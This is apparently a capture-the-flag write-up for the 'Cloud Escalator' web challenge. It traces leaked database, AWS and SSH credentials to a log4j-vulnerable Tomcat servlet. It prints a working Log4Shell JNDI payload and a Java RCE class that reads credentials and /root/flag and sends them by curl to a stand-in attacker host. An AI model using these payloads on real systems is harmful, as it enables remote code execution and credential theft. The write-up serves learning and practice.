# Cloud Escalator part 1
## The App
Cloud Escalator shows just an image with "Under Construction" on the start page.

## Exploring content
First I explored the site by opening it with ZAP Proxy.

### Path /
Nothing

### Path /logout

### Path /login
There is a login form which can submit username and password. Login with `admin` `admin` is not possible and shows a `The username and/or password are not valid` message. There is a `Forgot password` link which goes to `/forgotpassword.html`

The passwords from the database do not seem to be crackable with Hashcat (not a top 1.000.000 password + no result after 7 character brute force).

SQL Injection does not seem to work.

### Path /forgotpassword.html
This site has some JavaScript which is does not work:

```javascript
function errorMessage() {
	var error = document.getElementById("error")
	if (isNaN(document.getElementById("number").value))
	{
			
		// Complete the connection to mysqldb escalator.c45luksaam7a.us-east-1.rds.amazonaws.com. Use credential allen:8%pZ-s^Z+P4d=h@P
		error.textContent = "Under Construction"
		error.style.color = "red"
	} else {
		error.textContent = "Under Construction"
	}
}
```

Another thing to note except the database credentials is the `JSESSIONID` cookie.

Custom header `ETag: W/"1562-1656070092000"` also might be interesting (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag Spoiler: It is not).

Trying to submit a username from the database does not seem to do something.

### Path /admin
HTTP 404, shows an Apache Tomcat default HTTP 404 error.

### Path /dashboard
HTTP 404, shows an Apache Tomcat default HTTP 404 error.

### Database
Openening the database reveals some shemas:

- accounts
- config
- env
- innodb
- sys
- users

#### Database schema users
##### Table data
Reveals a Flag.

##### Table employees_login
Contains `Emp_id`, `User_name` and `Password`. The passwords are hashed with SHA1.

##### Table employees
Contains some personal data about the employees. `Email`s are all `@dummy.com` and `Date_of_Birth` is all `0000-00-00`.

#### Database schema env
##### Table git
Contains an OpenSSH private key.

#### Database schema config
##### Table aws_env
Contains:

- `user` =  `s3user1`
- `access_key` = `AKIAWSXCCGNYFS7NN2XU`
- `secret` = `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`

#### Database schema accounts
##### Table employees_account
Contains `Emp_id`, `Username`, `Account_number`

### Amazon S3
The crdentials in the `aws_env` table can be used to access an Amazon S3 bucket with. Download is possible with AWS CLI (after `aws configure`): 
`aws s3 cp s3://escalator-logger-armour/ ~/Dokumente/CTFs/Hack\ Holidays\ -\ Unlock\ the\ City\ 2022/Web/Cloud\ Escalator/s3 --recursive --include "*"`

It contains a tomcat log. After analyzing it, I saw another flag:

`23-Jun-2022 12:50:31.561 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: CTF{example_flag}`

After some more analyzing, I stumbled on this suspicious line:

`23-Jun-2022 12:50:31.551 ERROR [main] unable to pull update from github.com/cloudhopper-sec/app.git`

The repository is not accessible on GitHub. However, the account exists.

### GitHub Repository
GitHub repository can be cloned with the command `bash core.sshCommand="ssh -i ~/location/to/private_ssh_key"`

The SSH key is the one leaked from the database.

The repository contains the source code of the challenge including a Dockerfile.

### Apache Tomcat
The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious `PUT` of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).

I tried it but the server is not vulnerable and forbids  `PUT` requests.

## Code Review
The Java Servlet has `log4j` 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).

Looking at the code, `ProfileServlet.java` logs the content of a `debug` Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.

JNDI payload:
`Payload - ${jndi:ldap://172.17.0.1:2022/foo}`

base64 encoded (for Cookie):
`VGVzdCAtICR7am5kaTpsZGFwOi8vMTcyLjE3LjAuMToyMDIyL2Zvb30`

In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is `SHA256(username + password)`.  The Database credentials don't work.

Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.

## Exploiting log4j for the flag (after challange for testing)
(Note: I was to lazy to write a beautiful Java code)

```java
public class RcePayload {
    private static final String HOST = "http://malicious.example.org";

    public RcePayload() {
        try {
            Class cookieHandlerClass = Class.forName("com.cloudEscalator.util.CookieHandler");
            Field usernamField = cookieHandlerClass.getDeclaredField("USERNAME");
            usernamField.setAccessible(true);
            Field passwordField = cookieHandlerClass.getDeclaredField("PASSWORD");
            passwordField.setAccessible(true);

            String username = (String) usernamField.get(null);
            String password = (String) passwordField.get(null);

            System.out.println(String.format("Username: %s Password: %s", username, password));

            // Send username and password to malicious server
            String command = String.format("curl --insecure %s/?username=%s&password=%s", RcePayload.HOST, username, password);
            System.out.println(command);
            Process p = Runtime.getRuntime().exec(command);
            p.waitFor();
            
            InputStream errorStream = p.getErrorStream();

            BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            reader.close();

            // Send flag to malicious server
            File flagFile = new File("/root/flag");
            Scanner myReader = new Scanner(flagFile);
            String content = "";
            while (myReader.hasNextLine()) {
                line = myReader.nextLine();
                content += line + "\n";
            }
            myReader.close();

            String command2 = String.format("curl --insecure %s/?flag=%s", RcePayload.HOST, URLEncoder.encode(content, StandardCharsets.UTF_8.toString()));
            System.out.println(command2);
            Process p2 = Runtime.getRuntime().exec(command2);
            p2.waitFor();
            
            InputStream errorStream2 = p2.getErrorStream();

            BufferedReader reader2 = new BufferedReader(new InputStreamReader(errorStream2));
            String line2;
            while ((line2 = reader2.readLine()) != null) {
                System.out.println(line2);
            }

            reader2.close();
        } catch (Exception e) {
            e.printStackTrace(System.out);
        }
    }
}
```

